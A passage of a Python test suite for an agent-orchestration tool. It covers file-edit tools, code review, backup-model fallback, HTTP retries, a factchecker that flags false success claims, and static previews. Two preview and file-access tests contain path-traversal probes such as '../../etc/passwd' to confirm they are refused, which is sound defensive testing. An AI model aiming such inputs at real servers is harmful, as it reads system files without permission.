                                               key=[e["id"] for e in events].index)
    assert len(events) == 2                       # created + chat, each once


def test_an_enormous_prompt_does_not_go_on_disk_whole(tmp_path):
    """A model_call carries the whole prompt; a long run would be hundreds of
    megabytes of mostly-repeated context."""
    from trance.events import Event
    from trance.trace.session_log import SessionLog

    log = SessionLog(tmp_path)
    log.append(Event(type="model_call", session_id="s", step_id="st1", agent="backend",
                     payload={"model": "big", "round": 3,
                              "messages": [{"role": "user", "content": "x" * 400_000}],
                              "response_text": "done"}))

    stored = log.read()
    assert len(stored) == 1
    kept = stored[0].payload
    assert kept["model"] == "big" and kept["round"] == 3       # the shape survives
    assert kept["response_text"] == "done"
    assert "not kept on disk" in kept["messages"]              # the bulk does not
    assert kept["truncated_on_disk"] == ["messages"]
    assert tmp_path.joinpath("events.jsonl").stat().st_size < 100_000


def test_a_torn_last_line_costs_one_event_not_the_file(tmp_path):
    """JSON Lines so a kill mid-write does not take the trace with it."""
    from trance.events import Event
    from trance.trace.session_log import SessionLog

    log = SessionLog(tmp_path)
    log.append(Event(type="chat", session_id="s", payload={"content": "first"}))
    log.append(Event(type="chat", session_id="s", payload={"content": "second"}))
    with log.path.open("a", encoding="utf8") as handle:
        handle.write('{"type": "chat", "sess')          # killed mid-write

    kept = log.read()
    assert [e.payload["content"] for e in kept] == ["first", "second"]


# =============== changing part of a file, instead of re-emitting all of it

def test_edit_file_changes_a_snippet_and_leaves_the_rest(tmp_path):
    """Rewriting a 600-line file to change ten lines costs the whole file in
    output tokens and gets cut off mid-string."""
    tools = _tools(tmp_path)
    (tmp_path / "server").mkdir()
    body = "const PORT = 3000;\n" + "// filler\n" * 400 + "app.listen(PORT);\n"
    (tmp_path / "server" / "app.js").write_text(body)

    outcome = tools.call("edit_file", {
        "path": "server/app.js", "find": "const PORT = 3000;",
        "replace": "const PORT = process.env.PORT || 3100;"})

    text = (tmp_path / "server" / "app.js").read_text()
    assert outcome.ok is True
    assert "process.env.PORT || 3100" in text
    assert text.count("// filler") == 400        # nothing else moved
    assert outcome.detail["kind"] == "write" and outcome.detail["added"] == 1


def test_an_ambiguous_edit_is_refused_rather_than_guessed(tmp_path):
    """"Replace the first one" is a guess about which one was meant, and
    silently editing the wrong occurrence is worse than failing."""
    tools = _tools(tmp_path)
    (tmp_path / "server").mkdir()
    (tmp_path / "server" / "app.js").write_text("let x = 1;\nlet x = 1;\n")

    outcome = tools.call("edit_file", {"path": "server/app.js",
                                       "find": "let x = 1;", "replace": "let x = 2;"})
    assert outcome.ok is False
    assert "appears 2 times" in outcome.text
    assert (tmp_path / "server" / "app.js").read_text() == "let x = 1;\nlet x = 1;\n"


def test_an_edit_that_does_not_match_says_why(tmp_path):
    tools = _tools(tmp_path)
    (tmp_path / "server").mkdir()
    (tmp_path / "server" / "app.js").write_text("    const port = 3000;\n")

    outcome = tools.call("edit_file", {"path": "server/app.js",
                                       "find": "const port = 3000;   ",
                                       "replace": "const port = 3100;"})
    assert outcome.ok is False
    assert "match exactly" in outcome.text and "indentation" in outcome.text


def test_an_edit_obeys_the_remit(tmp_path):
    tools = _tools(tmp_path, "tester")
    (tmp_path / "server").mkdir()
    (tmp_path / "server" / "app.js").write_text("x = 1\n")

    outcome = tools.call("edit_file", {"path": "server/app.js",
                                       "find": "x = 1", "replace": "x = 2"})
    assert outcome.ok is False and outcome.remit_violation == "server/app.js"
    assert (tmp_path / "server" / "app.js").read_text() == "x = 1\n"


def test_replace_symbol_swaps_a_function_without_quoting_it_back(tmp_path):
    """The graph already knows where the function starts and ends."""
    tools = _indexed_tools(tmp_path, "backend")
    (tmp_path / "app.py").write_text(
        "import os\n\n\ndef charge(order):\n    return 0\n\n\ndef refund(order):\n"
        "    return 1\n")
    tools._reindex = None
    from trance.indexer.service import index_repo
    index_repo(tmp_path, tools.graph.db)

    outcome = tools.call("replace_symbol", {
        "symbol": "charge", "source": "def charge(order):\n    return order.total"})

    text = (tmp_path / "app.py").read_text()
    assert outcome.ok is True
    assert "return order.total" in text
    assert "def refund(order):\n    return 1" in text     # its neighbour is intact
    assert text.startswith("import os")


def test_replace_symbol_will_not_guess_between_two_of_the_same_name(tmp_path):
    from trance.indexer.service import index_repo

    tools = _indexed_tools(tmp_path, "backend")
    (tmp_path / "a.py").write_text("def run():\n    return 1\n")
    (tmp_path / "b.py").write_text("def run():\n    return 2\n")
    index_repo(tmp_path, tools.graph.db)

    outcome = tools.call("replace_symbol", {"symbol": "run", "source": "def run():\n    pass"})
    assert outcome.ok is False and "matches 2 symbols" in outcome.text
    assert (tmp_path / "a.py").read_text() == "def run():\n    return 1\n"


def test_the_edit_tools_are_offered_and_explained(tmp_path):
    from trance.agents.tools import permissions_brief

    tools = _indexed_tools(tmp_path, "backend")
    offered = {s["function"]["name"] for s in tools.specs()}
    assert {"edit_file", "replace_symbol", "write_file", "append_file"} <= offered

    brief = permissions_brief(BUILTIN_ROLES["backend"])
    assert "edit_file" in brief and "size of the edit" in brief
    assert "edit_file" in BUILTIN_ROLES["backend"].system_prompt


# ================================ the files view and the review it produces

def _files_client(tmp_path, with_git=True, monkeypatch=None):
    from fastapi.testclient import TestClient

    from trance import vcs
    from trance.config import Config
    from trance.server import app as app_module

    if monkeypatch is not None:
        # Sending a review starts the flow. A real engine racing the assertions
        # is a test problem, not a product one.
        class FakeEngine:
            def __init__(self, session, config, bus, on_change=None, **kwargs):
                self.session = session

            def start(self):
                self.session.status = "running"
                return None

        monkeypatch.setattr(app_module, "FlowEngine", FakeEngine)

    project = tmp_path / "proj"
    (project / "server").mkdir(parents=True)
    (project / "server" / "app.js").write_text("const PORT = 3000;\napp.listen(PORT);\n")
    (project / "node_modules").mkdir()
    (project / "node_modules" / "junk.js").write_text("x")
    if with_git:
        vcs.ensure_repo(project)
        vcs.commit_all(project, "start")

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]
    return app, client, sid, project


def test_the_file_tree_skips_what_nobody_reviews(tmp_path):
    _, client, sid, _ = _files_client(tmp_path)
    body = client.get(f"/api/sessions/{sid}/files").json()
    paths = [f["path"] for f in body["files"]]

    assert "server/app.js" in paths
    assert not any("node_modules" in p for p in paths)
    assert not any(p.startswith(".git/") for p in paths)


def test_a_file_opens_and_a_path_that_escapes_does_not(tmp_path):
    _, client, sid, _ = _files_client(tmp_path)

    body = client.get(f"/api/sessions/{sid}/file", params={"path": "server/app.js"}).json()
    assert "const PORT = 3000;" in body["content"] and body["lines"] == 2

    escaped = client.get(f"/api/sessions/{sid}/file", params={"path": "../../etc/passwd"})
    assert escaped.status_code in (400, 404)


def test_your_own_edit_is_saved_and_committed(tmp_path):
    from trance import vcs

    _, client, sid, project = _files_client(tmp_path)
    body = client.put(f"/api/sessions/{sid}/file", json={
        "path": "server/app.js", "content": "const PORT = 3100;\napp.listen(PORT);\n"}).json()

    assert body["committed"] is True
    assert (project / "server" / "app.js").read_text().startswith("const PORT = 3100;")
    assert any("you: edited server/app.js" in c["subject"] for c in vcs.log(project))


def test_review_comments_become_a_step_the_flow_runs(tmp_path, monkeypatch):
    app, client, sid, _ = _files_client(tmp_path, monkeypatch=monkeypatch)
    client.post(f"/api/sessions/{sid}/review", json={
        "path": "server/app.js", "line": 1, "code": "const PORT = 3000;",
        "note": "read the port from the environment"})
    client.post(f"/api/sessions/{sid}/review", json={
        "path": "server/app.js", "line": 2, "note": "log the port on start"})

    body = client.post(f"/api/sessions/{sid}/review/finish").json()
    session = app.state.store.get(sid)
    step = session.flow.steps[-1]

    assert body["notes"] and len(body["notes"]) == 2
    assert step.loop == "test-and-fix"                 # a loop, so a fix gets tested
    assert "line 1" in step.task and "read the port from the environment" in step.task
    assert "line 2" in step.task
    assert "`const PORT = 3000;`" in step.task         # the line it was written on
    assert session.review == []                        # the pad is cleared
    assert {"tester", "backend"} <= {r.name for r in session.team}


def test_finishing_an_empty_review_is_refused(tmp_path):
    _, client, sid, _ = _files_client(tmp_path)
    assert client.post(f"/api/sessions/{sid}/review/finish").status_code == 400


def test_a_note_can_be_taken_back_before_it_is_sent(tmp_path):
    app, client, sid, _ = _files_client(tmp_path)
    note = client.post(f"/api/sessions/{sid}/review", json={
        "path": "server/app.js", "line": 1, "note": "actually this is fine"}).json()

    client.delete(f"/api/sessions/{sid}/review/{note['id']}")
    assert app.state.store.get(sid).review == []


def test_what_was_done_about_a_review_comes_from_git(tmp_path, monkeypatch):
    from trance import vcs

    app, client, sid, project = _files_client(tmp_path, monkeypatch=monkeypatch)
    client.post(f"/api/sessions/{sid}/review", json={
        "path": "server/app.js", "line": 1, "note": "read the port from the environment"})
    client.post(f"/api/sessions/{sid}/review/finish")

    # The agent does the work and the step finishes.
    (project / "server" / "app.js").write_text(
        "const PORT = process.env.PORT || 3000;\napp.listen(PORT);\n")
    vcs.commit_all(project, "backend: address the review [SUCCESS]")
    session = app.state.store.get(sid)
    session.flow.steps[-1].status = "done"

    body = client.get(f"/api/sessions/{sid}/review/changes").json()

    assert body["status"] == "done"
    assert body["files"] == ["server/app.js"]
    assert "process.env.PORT" in body["diff"]
    assert body["before"] and body["after"] and body["before"] != body["after"]


def test_changes_are_empty_while_the_review_step_is_still_running(tmp_path, monkeypatch):
    _, client, sid, _ = _files_client(tmp_path, monkeypatch=monkeypatch)
    client.post(f"/api/sessions/{sid}/review",
                json={"path": "server/app.js", "line": 1, "note": "fix it"})
    client.post(f"/api/sessions/{sid}/review/finish")

    body = client.get(f"/api/sessions/{sid}/review/changes").json()
    assert body["status"] == "pending" and body["diff"] == ""


# ================== an agent's own backup model, once it keeps failing

def _backup_engine(tmp_path, team=("backend", "tester"), after=1):
    import copy

    from trance.providers.base import ModelPreset

    engine = _engine(tmp_path, list(team))
    engine.config.presets["everyday"] = ModelPreset(name="everyday", kind="llamacpp",
                                                    model="small-model")
    engine.config.presets["clever"] = ModelPreset(name="clever", kind="anthropic",
                                                  model="big-model", api_key="sk-x")
    engine.session.team = [copy.deepcopy(r) for r in engine.session.team]
    for role in engine.session.team:
        role.preset = "everyday"
        role.backup_preset = "clever"
        role.tries = after
        role.backup_tries = 2
    return engine


def test_an_agent_switches_to_its_backup_after_enough_tries(tmp_path, monkeypatch):
    """The loop varies the prompt and the feedback; the model is the one thing
    it never varies, so a third failure looks like the first."""
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=1)
    step = Step(role="backend", task="fix the socket handling", max_loops=3)
    used = []

    def fake(**kw):
        used.append(kw["config"].model)
        succeeded = kw["config"].model == "big-model"
        return _Turn(None, "x", outcome=("SUCCESS", "") if succeeded
                     else ("FAILED", "still broken"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert used == ["small-model", "big-model"]      # one try, then the backup
    assert step.status == "done"
    assert step.attempts[1].on_backup is True and step.attempts[0].on_backup is False
    switched = [e for e in engine.bus.history(engine.session.id)
                if e.type == "model_switched"]
    assert switched and "backup model big-model" in switched[0].payload["message"]


def test_the_threshold_is_what_decides(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=2)
    step = Step(role="backend", task="t", max_loops=4)
    used = []

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model)
        or _Turn(None, "x", outcome=("FAILED", "no"))))
    engine._execute(step)

    assert used == ["small-model", "small-model", "big-model", "big-model"]


def test_no_backup_configured_changes_nothing(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _backup_engine(tmp_path)
    for role in engine.session.team:
        role.backup_preset = None                    # nothing to fall back to
    step = Step(role="backend", task="t", max_loops=3)
    used = []

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("FAILED", "no"))))
    engine._execute(step)
    assert used == ["small-model"] * 3


def test_a_backup_that_does_not_exist_says_so_and_carries_on(tmp_path, monkeypatch):
    """A stale name must not strand an agent that was working."""
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=1)
    for role in engine.session.team:
        role.backup_preset = "deleted-last-week"
    step = Step(role="backend", task="t", max_loops=3)
    used = []

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("FAILED", "no"))))
    engine._execute(step)

    assert used == ["small-model"] * 3
    warned = [e for e in engine.bus.history(engine.session.id) if e.type == "warning"]
    assert any("not defined" in e.payload["message"] for e in warned)


def test_in_a_loop_the_count_is_per_agent(tmp_path, monkeypatch):
    """A tester that has run three times and a fixer that has run twice are not
    in the same position."""
    from trance.agents.store import LoopStore
    from trance.flow import Step
    from trance.loops import EXIT_LOOP, FAILED, FAIL_LOOP, SUCCESS, Edge, Loop, LoopNode

    engine = _backup_engine(tmp_path, after=2)
    loop = Loop(name="tf", start="n1", nodes=[
        LoopNode(id="n1", role="tester", on={SUCCESS: Edge(EXIT_LOOP),
                                             FAILED: Edge("n2", max_visits=5)}),
        LoopNode(id="n2", role="backend", on={SUCCESS: Edge("n1", max_visits=5),
                                              FAILED: Edge(FAIL_LOOP)})])
    store = LoopStore(tmp_path / "l.json", seed=False)
    store.upsert(loop)
    engine.loops = store

    seen = []

    def fake(**kw):
        seen.append((kw["role"].name, kw["config"].model))
        return _Turn(None, "x", outcome=("FAILED", "nope") if kw["role"].name == "tester"
                     else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(Step(role="", loop="tf", task="t"))

    testers = [model for name, model in seen if name == "tester"]
    assert testers[:2] == ["small-model", "small-model"]
    assert testers[2] == "big-model"          # its third run, its own count


def test_an_agent_gets_two_tries_then_two_on_its_backup(tmp_path, monkeypatch):
    """Four attempts in all, without the step having to say so."""
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=2)
    step = Step(role="backend", task="t")            # no max_loops: the agent decides
    used = []

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("FAILED", "no"))))
    engine._execute(step)

    assert used == ["small-model", "small-model", "big-model", "big-model"]
    assert len(step.attempts) == 4


def test_an_agent_with_no_backup_just_gets_its_own_tries(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=3)
    for role in engine.session.team:
        role.backup_preset = None
    step = Step(role="backend", task="t")
    used = []

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("FAILED", "no"))))
    engine._execute(step)
    assert used == ["small-model"] * 3


def test_a_step_can_override_the_agents_count(tmp_path, monkeypatch):
    """Some work is worth one try and some is worth six, and the step is where
    that is known."""
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=2)       # the agent would give 4
    used = []
    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("FAILED", "no"))))

    engine._execute(Step(role="backend", task="t", max_loops=1))
    assert used == ["small-model"]

    used.clear()
    engine.session.clear_stop()          # the first halt would stop the second
    engine._execute(Step(role="backend", task="t", max_loops=3))
    assert used == ["small-model", "small-model", "big-model"]


def test_the_default_agent_is_two_and_two(tmp_path):
    from trance.agents.roles import BUILTIN_ROLES

    backend = BUILTIN_ROLES["backend"]
    assert backend.tries == 2 and backend.backup_tries == 2
    assert backend.total_tries == 2                  # no backup set, so just its own

    import copy
    with_backup = copy.deepcopy(backend)
    with_backup.backup_preset = "clever"
    assert with_backup.total_tries == 4


def test_an_older_agent_keeps_the_switch_point_it_had():
    """`backup_after` was the name before it was `tries`."""
    from trance.agents.roles import AgentRole

    role = AgentRole.from_dict({
        "name": "backend", "title": "B", "description": "d", "system_prompt": "p",
        "backup_preset": "clever", "backup_after": 3})
    assert role.tries == 3 and role.total_tries == 5


# ============== an endpoint that is down is a failed try, not a failed step

def test_a_transient_status_is_retried_before_giving_up(monkeypatch):
    """A 503 is a busy gateway, not a wrong request — giving up on the first
    one throws away a step for something that clears in a second."""
    import io
    import json
    import urllib.error
    import urllib.request

    from trance.config import ModelConfig
    from trance.worker import client as client_module

    calls = []

    def flaky(request, timeout=None):
        calls.append(1)
        if len(calls) < 3:
            raise urllib.error.HTTPError("u", 503, "busy", {}, io.BytesIO(b""))

        class Ok:
            def read(self):
                return json.dumps({"choices": [{"message": {"content": "hi"}}]}).encode()

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        return Ok()

    monkeypatch.setattr(urllib.request, "urlopen", flaky)
    monkeypatch.setattr(client_module, "BACKOFF_S", 0)
    reply = client_module.ChatClient(ModelConfig()).complete(
        [{"role": "user", "content": "hi"}])

    assert reply.text == "hi" and len(calls) == 3


def test_a_bad_key_is_not_retried(monkeypatch):
    """401 means you asked wrong; asking again is just slower."""
    import io
    import urllib.error
    import urllib.request

    from trance.config import ModelConfig
    from trance.providers.base import BackendError
    from trance.worker import client as client_module

    calls = []

    def refused(request, timeout=None):
        calls.append(1)
        raise urllib.error.HTTPError("u", 401, "nope", {}, io.BytesIO(b"bad key"))

    monkeypatch.setattr(urllib.request, "urlopen", refused)
    monkeypatch.setattr(client_module, "BACKOFF_S", 0)
    with pytest.raises(BackendError):
        client_module.ChatClient(ModelConfig()).complete([{"role": "user", "content": "x"}])
    assert len(calls) == 1


def test_an_unreachable_model_moves_to_the_backup(tmp_path, monkeypatch):
    """Regression: a 503 from the endpoint killed the whole step."""
    from trance.flow import Step
    from trance.providers.base import BackendError

    engine = _backup_engine(tmp_path, after=2)
    step = Step(role="backend", task="t")
    used = []

    def fake(**kw):
        model = kw["config"].model
        used.append(model)
        if model == "small-model":
            raise BackendError("https://zen/v1/chat/completions returned 503: ")
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    # One dead try on the usual model, then straight to the backup — not two
    # more on a URL that is down.
    assert used == ["small-model", "big-model"]
    assert step.status == "done"
    told = [e for e in engine.bus.history(engine.session.id)
            if e.type == "model_unreachable"]
    assert told and "Trying clever next." in told[0].payload["message"]


def test_an_unreachable_model_with_no_backup_still_ends_the_step_cleanly(
        tmp_path, monkeypatch):
    from trance.flow import Step
    from trance.providers.base import BackendError

    engine = _backup_engine(tmp_path, after=2)
    for role in engine.session.team:
        role.backup_preset = None
    step = Step(role="backend", task="t", max_loops=2)

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (_ for _ in ()).throw(
        BackendError("returned 503: ")))
    engine._execute(step)

    assert step.status == "failed"
    assert len(step.attempts) == 2                       # it tried, it did not crash
    assert "endpoint failed" in step.attempts[-1].outcome_reason
    assert engine.session.status == "error"              # halted, with a reason


def test_the_agent_is_told_what_the_check_found(tmp_path, monkeypatch):
    """A retry is only worth anything if it knows what was missing."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="build the page", check="factchecker", max_loops=2)
    steering = []
    checks = []

    def fake(**kw):
        if kw["role"].name == "factchecker":
            checks.append(1)
            return _Turn("FAIL", "index.html is MISSING — it was never written")
        steering.append("\n".join(kw.get("steering") or []))
        return _Turn(None, "all done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert steering[0] == ""                        # nothing to say on the first try
    assert "factchecker checked and disagreed" in steering[1]
    assert "index.html is MISSING" in steering[1]
    assert "Do not report success again until that is actually true" in steering[1]


def test_a_check_that_passes_on_the_retry_finishes_the_step(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="t", check="factchecker", max_loops=3)
    seen = {"checks": 0}

    def fake(**kw):
        if kw["role"].name == "factchecker":
            seen["checks"] += 1
            return _Turn("FAIL", "not there yet") if seen["checks"] == 1 \
                else _Turn("PASS", "it is there")
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert step.status == "done"
    assert [a.outcome for a in step.attempts] == ["CHECK_FAILED", "SUCCESS"]
    assert engine.session.status != "error"


def test_a_check_that_keeps_failing_still_halts_the_run(tmp_path, monkeypatch):
    """It had its chances to make the report true. Later steps must not build
    on work that is not there."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="t", check="factchecker", max_loops=2)

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        _Turn("FAIL", "still nothing on disk") if kw["role"].name == "factchecker"
        else _Turn(None, "done", outcome=("SUCCESS", ""))))
    engine._execute(step)

    assert step.status == "failed"
    assert engine.session.status == "error"
    halted = next(e for e in engine.bus.history(engine.session.id)
                  if e.type == "run_halted")
    assert halted.payload["lied"] is True           # the honest description of it


def test_a_proposed_step_runs_for_as_long_as_its_agent_allows(tmp_path, monkeypatch):
    """End to end: nothing between the proposal and the engine puts a number
    on the step, so the agent's own count is what runs."""
    from trance.flow import Step
    from trance.agents.orchestrator import _normalize

    proposed = _normalize({"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "task": "build it", "points": 3}]}, list(BUILTIN_ROLES.values()))
    step = Step.from_dict(proposed["steps"][0])
    assert step.overrides_tries is False

    engine = _backup_engine(tmp_path, after=2)      # 2 + 2 on the backup
    used = []
    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("FAILED", "no"))))
    engine._execute(step)

    assert used == ["small-model", "small-model", "big-model", "big-model"]


def test_a_step_can_be_rerun_straight_onto_the_backup(tmp_path, monkeypatch):
    """You have watched the usual model fail; spending its tries again is only
    slower."""
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=2)
    step = Step(role="backend", task="t", start_on_backup=True)
    used = []

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: (
        used.append(kw["config"].model) or _Turn(None, "x", outcome=("SUCCESS", ""))))
    engine._execute(step)

    assert used == ["big-model"]                    # not two tries on the small one
    assert step.attempts[0].on_backup is True
    assert step.start_on_backup is False            # spent, not sticky


def test_the_rerun_endpoint_takes_the_backup_flag(tmp_path, monkeypatch):
    import copy

    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    class FakeEngine:
        def __init__(self, session, config, bus, on_change=None, **kwargs):
            self.session = session

        def start(self):
            self.session.status = "running"
            return None

    monkeypatch.setattr(app_module, "FlowEngine", FakeEngine)
    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)

    client.put("/api/presets/clever", json={"kind": "anthropic", "model": "claude-opus-5"})
    client.put("/api/agents/backend", json={"backup_preset": "clever"})
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [{"role": "backend", "task": "t"}]})
    session = app.state.store.get(sid)
    step_id = session.flow.steps[0].id

    body = client.post(f"/api/sessions/{sid}/steps/{step_id}/rerun",
                       json={"on_backup": True}).json()
    assert body["on_backup"] is True
    assert session.flow.steps[0].start_on_backup is True

    # And a plain rerun clears it again.
    body = client.post(f"/api/sessions/{sid}/steps/{step_id}/rerun", json={}).json()
    assert body["on_backup"] is False
    assert session.flow.steps[0].start_on_backup is False


def test_asking_for_a_backup_that_is_not_configured_is_refused(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [{"role": "backend", "task": "t"}]})
    step_id = app.state.store.get(sid).flow.steps[0].id

    response = client.post(f"/api/sessions/{sid}/steps/{step_id}/rerun",
                           json={"on_backup": True})
    assert response.status_code == 400
    assert "no backup model" in response.json()["detail"]


def test_the_check_only_runs_on_a_claim_of_success(tmp_path, monkeypatch):
    """The check asks "is that true?". An agent that already said it failed has
    made no claim to test, and asking costs a model call to confirm what was
    just admitted."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="t", check="factchecker", max_loops=2)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        if kw["role"].name == "factchecker":
            return _Turn("PASS", "it is all there")
        return _Turn(None, "x", outcome=("FAILED", "could not finish"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert order == ["backend", "backend"]          # the checker was never called
    assert step.status == "failed"
    assert all(a.gate_results == [] for a in step.attempts)


def test_an_unstated_outcome_is_not_checked_either(tmp_path, monkeypatch):
    """"I did not say" is not a claim of success."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="t", check="factchecker", max_loops=1)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        return _Turn(None, "no outcome line at all", outcome=("UNSTATED", "nothing said"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert order == ["backend"]


# ------------------------------------- what is in the project, and running it

def test_the_file_listing_counts_lines_by_kind_of_file(tmp_path):
    """"4,300 lines" says almost nothing; 4,000 of JavaScript and 300 of CSS
    says what was built."""
    _, client, sid, project = _files_client(tmp_path)
    (project / "js").mkdir()
    (project / "js" / "app.js").write_text("let a = 1;\n" * 40)
    (project / "js" / "chart.js").write_text("let b = 2;\n" * 60)
    (project / "style.css").write_text("body {}\n" * 12)
    (project / "Makefile").write_text("all:\n")

    totals = {t["ext"]: t for t in client.get(f"/api/sessions/{sid}/files").json()["totals"]}

    # 100 here plus the two lines of server/app.js the fixture writes.
    assert totals["js"]["lines"] == 102 and totals["js"]["files"] == 3
    assert totals["css"]["lines"] == 12
    # Makefile is not "makefile", and a dotfile has no extension either — the
    # fixture's repo has a .gitignore, which is as much a project file as any.
    assert totals["(no suffix)"]["files"] == 2
    # Biggest first, so the shape of the project is the first thing read.
    order = [t["ext"] for t in client.get(f"/api/sessions/{sid}/files").json()["totals"]]
    assert order[0] == "js"


def test_a_page_is_served_from_its_own_folder(tmp_path):
    """A page asks for /js/app.js from its own root. Serving the project root
    would 404 every absolute path in it."""
    import urllib.request

    _, client, sid, project = _files_client(tmp_path)
    public = project / "server" / "public"
    (public / "js").mkdir(parents=True)
    (public / "index.html").write_text('<script src="/js/app.js"></script>')
    (public / "js" / "app.js").write_text("console.log(1)")

    served = client.post(f"/api/sessions/{sid}/preview",
                         json={"path": "server/public/index.html"}).json()
    try:
        assert served["root"].endswith("server/public")
        assert served["open"].endswith("/index.html")
        # `open` is built from the Host the browser used, which under the test
        # client is the unresolvable "testserver"; `local` is the same server.
        page = urllib.request.urlopen(served["local"] + "index.html",
                                      timeout=5).read().decode()
        assert "/js/app.js" in page
        js = urllib.request.urlopen(served["local"] + "js/app.js", timeout=5).read()
        assert b"console.log(1)" in js               # the absolute path resolves
    finally:
        client.delete(f"/api/sessions/{sid}/preview")


def test_the_preview_cannot_reach_outside_what_it_serves(tmp_path):
    import urllib.error
    import urllib.request

    _, client, sid, project = _files_client(tmp_path)
    public = project / "public"
    public.mkdir()
    (public / "index.html").write_text("<html></html>")
    (project / "secret.txt").write_text("not for the web")

    served = client.post(f"/api/sessions/{sid}/preview",
                         json={"path": "public/index.html"}).json()
    try:
        for escape in ("../secret.txt", "..%2Fsecret.txt", "../../etc/passwd"):
            try:
                body = urllib.request.urlopen(served["local"] + escape, timeout=5).read()
            except urllib.error.HTTPError:
                continue                              # refused, which is the point
            assert b"not for the web" not in body
            assert b"root:" not in body
    finally:
        client.delete(f"/api/sessions/{sid}/preview")


def test_a_preview_does_not_outlive_its_session(tmp_path):
    import urllib.error
    import urllib.request

    app, client, sid, project = _files_client(tmp_path)
    (project / "index.html").write_text("<html></html>")
    served = client.post(f"/api/sessions/{sid}/preview",
                         json={"path": "index.html"}).json()
    assert urllib.request.urlopen(served["local"] + "index.html", timeout=5).status == 200

    client.delete(f"/api/sessions/{sid}")
    with pytest.raises((urllib.error.URLError, OSError)):
        urllib.request.urlopen(served["local"] + "index.html", timeout=3)


def test_asking_twice_for_the_same_folder_keeps_the_same_port(tmp_path):
    """A new origin each time would throw away whatever the page had stored."""
    _, client, sid, project = _files_client(tmp_path)
    (project / "index.html").write_text("<html></html>")

    first = client.post(f"/api/sessions/{sid}/preview", json={"path": "index.html"}).json()
    second = client.post(f"/api/sessions/{sid}/preview", json={"path": "index.html"}).json()
    try:
        assert first["port"] == second["port"]
    finally:
        client.delete(f"/api/sessions/{sid}/preview")


def test_a_project_with_a_build_step_is_reported_not_run(tmp_path):
    """A Vite app imports bare module names that only its dev server resolves,
    so the static preview will load and then fail. Trance says which command
    would build it and does not run it — that is the user's to start."""
    from trance import preview

    project = tmp_path / "app"
    project.mkdir()
    (project / "vite.config.js").write_text("export default {}")
    (project / "package.json").write_text(
        '{"scripts": {"dev": "vite", "build": "vite build"}}')
    (project / "index.html").write_text('<script type="module" src="/src/main.js">')

    found = preview.dev_command(project, project)
    assert found["command"] == "npm run dev" and found["needed"] is True


def test_a_plain_folder_is_served_statically(tmp_path):
    from trance import preview

    project = tmp_path / "app"
    (project / "public").mkdir(parents=True)
    (project / "public" / "index.html").write_text("<html></html>")
    assert preview.dev_command(project, project / "public") is None

    # A package.json with no build tool is not a reason to run anything either.
    (project / "package.json").write_text('{"scripts": {"dev": "node server.js"}}')
    found = preview.dev_command(project, project / "public")
    assert found["needed"] is False


